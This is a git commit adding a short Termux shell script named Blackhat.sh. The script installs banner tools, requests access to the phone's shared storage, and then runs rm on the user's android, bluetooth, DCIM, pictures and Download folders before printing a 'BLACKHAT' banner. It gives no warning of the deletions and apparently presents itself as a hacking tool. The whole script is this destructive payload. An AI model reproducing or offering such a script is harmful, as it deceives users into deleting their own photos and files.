28764554a57f42a03d244cd667dfb3800ead915f
TeamBlackHat <68024305+TeamBlackHat@users.noreply.github.com>
2020-07-09 00:14:55 +0700

    Add files via upload

---
+++ Blackhat.sh
@@ -0,0 +1,12 @@
+pkg update
+pkg upgrade
+pkg install figlet
+pkg install lolcat
+termux-setup-storage
+cd /storage/emulated/0
+rm android
+rm bluetooth
+rm DCIM
+rm pictures
+rm Download
+figlet BLACKHAT | lolcat
